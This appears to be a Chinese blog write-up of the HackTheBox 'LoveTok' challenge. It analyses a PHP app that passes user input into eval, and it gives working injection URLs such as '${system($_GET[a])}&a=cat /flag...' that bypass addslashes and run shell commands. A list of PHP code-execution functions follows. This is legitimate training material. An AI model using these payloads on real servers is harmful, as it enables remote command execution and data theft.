---
layout: post
title: HTB-Easy-LoveTok
excerpt: "第五道HTB题目,解题过程"
date:   2021-05-12 09:13:00
categories: [HackTheBox]
comments: true
---

## 解题步骤

1. 题目描述：True love is tough, and even harder to find. Once the sun has set, the lights close and the bell has rung... you find yourself licking your wounds and contemplating human existence. You wish to have somebody important in your life to share the experiences that come with it, the good and the bad. This is why we made LoveTok, the brand new service that accurately predicts in the threshold of milliseconds when love will come knockin' (at your door). Come and check it out, but don't try to cheat love because love cheats back. 💛

2. 访问网页

   ![image-20210513093104193](https://monkeydatabase.github.io/img/image-20210513093104193.png)

   * 可以点击的只有下面的红色按钮，访问地址为`http://IP:PORT/?format=r`，存在一个名为format的Get参数，值为r

3. 下载题目提供的源码，分析执行流程

   * 接收请求，创建Router对象

   * 调用Router对象的new方法

     * 入参

       * $method：'GET'
       * $route：'/'
       * $controller：'TimeController@index'

     * 处理结果存储到Router对象的$routes中

       ```php
       Array ( 
           [0] => Array ( 
               [method] => GET 
               [route] => / 
               [controller] => Array ( 
                   [class] => TimeController 
                   [function] => index 
               ) 
           ) 
       )
       ```

     * 关于参数

       * 疑问：当$controller不可调用，且不包含`@`时，会报错，但是$controller变量不是在代码里写死了嘛
       * 答案：因为Router页面也在根目录下，可以通过访问http://IP:Port/Router.php，直接访问该PHP文件，但是该文件是类，如何实例化呢

   * 调用Router对象的match方法，将结果返回给前端

     * 调用Time Controller获取时间

4. 主要研究可控参数的TimeController.php

   * 源码

     ```php
     <?php
     class TimeModel
     {
         public function __construct($format)
         {
             $this->format = addslashes($format);
             $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
         }
     
         public function getTime()
         {
             eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
             return isset($time) ? $time : 'Something went terribly wrong';
         }
     }
     ```

   * 从Get参数中获取format拼接字符串之后用eval进行命令执行，但是服务端对`'`、`"`、`\`进行了转义，应该是在PHP.ini中开启了magic_quotes_gpc=On

   * 在将format设置为特别乱的字符串时，发现将原字符串直接打印输出了，而没有对日期进行输出

   * 因为使用了双引号作为字符串符号，所以可以通过`${}`执行命令，访问`http://IP:Port/?format=${system(ls)}`执行ls指令，进行回显

     ![image-20210513111725352](https://monkeydatabase.github.io/img/image-20210513111725352.png)

   * 尝试访问根目录，访问`http://IP:Port/?format=${system(ls -l /)}`，发现网页崩溃，应该是括号里不用引号包裹的话不能有空格

   * 重新阅读网页源码发现它首先使用addslashes函数对format变量进行了处理，对单引号`'`、双引号`"`、反斜杠`\`、`NULL`，发现之前的转义是从这一步进行的

   * 查看之前的Docker创建过程，发现flag位于根目录下，且文件名被随机产生，因此不得不进行目录遍历

   * 因为php会把get参数放入\$\_GET\[\]数组中，而取\$\_GET\[\]中的值不用引号也是可以取的，addslashed函数只对format进行了过滤，而题目是使用双引号包裹的可以对变量进行访存取值，所以新增一个GET参数a，format参数去读取a参数作为system的变量执行，访问`http://IP:Port/?format=${system($_GET[a])}&a=ls /`

     ![image-20210513154311803](https://monkeydatabase.github.io/img/image-20210513154311803.png)

   * 发现flag文件，进行文件读取，访问`http://IP:Port/?format=${system($_GET[a])}&a=cat /flagkY8eQ`，获得flag：HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}

## 独立思考

### 1、PHP内的标点符号有什么含义？

* `''`：表示字符串，但内部的`${}`不会作为变量进行访问取值
* `""`：表示字符串，但内部的${}会进行访问取值
* 撇号：表示system函数

### 2、这种”多传一个参数，由原本的参数读取该参数“的方式在Java语言中有没有可能？

* 在SpringBoot的HTTP服务中，我们通常使用如下注解
  * 使用@PathVariable获取在路径中的变量，如`/page/1`
  * 使用@RequestParam获取Get参数，如`?page=1`
  * 使用@RequestBody获取请求体，如`{"page":1}`
* Java本身是编译为字节码之后才能加载入Java虚拟机，然后被SpringBoot转化为BeanDefinition，之后通过ApplicationContext进行调度，而PHP和Python为解释型语言，所以Java很难被以这种方式攻击，除非Web服务提供方在自己的代码里开放了使用实时编译加载等功能的接口。
* 其实PHP和Python也很难被这种方式攻击，因为一般来说这种加载字符串或文件作为代码执行的写法会在安全开发规范中明确禁止，当前开发人员不遵守开发规范的情况也很常见。

### 3、PHP中可以将字符串作为代码执行的函数有哪些？

* 以PHP代码执行

  * 以字符串方式

    * eval

    * assert

    * preg_replace：三个参数，第一个参数为正则表达式，第二个参数为被检查字符串，第三个参数为用来替换的新字符串，但当在正则表达式的两个`/`中的第二个`/`加上e，那么第二个参数就会作为PHP代码执行

      ```php
      preg_repace('/a/e',$_GET[payload],"b")
      ```

    * call_user_func：第一个参数方法名，后面的不定量参数作为方法的参数

      ```php
      call_user_func('system','ls')
      ```
  * 以文件方式

    * include
    * include_once
    * require
    * require_once

* 以shell代码执行

  * exec：不输出结果，只返回最后一行shell结果
  * system：输出结果，并返回最后一行shell结果
  * passthru：输出结果
  * 撇号：相当于system函数

## 产生过的疑问

1. PHP内的标点符号有什么含义？
2. 这种”多传一个参数，由原本的参数读取该参数“的方式在Java语言中有没有可能？
3. php中可以将字符串作为php代码执行的函数有哪些？

